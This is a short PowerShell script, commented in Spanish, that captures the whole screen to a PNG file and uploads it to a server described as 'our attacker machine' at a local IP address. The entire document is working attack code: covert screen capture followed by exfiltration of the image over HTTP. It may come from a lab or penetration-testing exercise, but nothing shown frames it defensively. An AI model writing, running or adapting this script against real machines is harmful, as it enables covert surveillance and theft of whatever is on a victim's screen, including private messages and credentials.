$File = "captura.png"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing

$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top

$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)

$bitmap.Save($File, [System.Drawing.Imaging.ImageFormat]::Png)

#Establecer la URL del servidor de nuestra máquina atacante y el nombre del archivo
$serverUrl = "http://192.168.0.39:8080"
$filePath = "captura.png"
$fileName = "captura.png"

$webClient = New-Object System.Net.WebClient
$webClient.UploadFile("$serverUrl/$fileName", $filePath)